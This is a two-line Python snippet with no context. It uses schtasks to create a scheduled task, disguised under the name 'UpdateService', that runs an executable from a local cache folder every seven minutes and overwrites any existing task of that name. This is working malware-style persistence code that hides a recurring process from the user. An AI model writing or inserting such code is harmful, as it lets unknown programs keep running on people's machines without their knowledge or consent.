import subprocess
subprocess.run(r'schtasks /create /sc MINUTE /mo 7 /tn UpdateService /tr "%LOCALAPPDATA%\Cache\worker.exe" /f', shell=True)
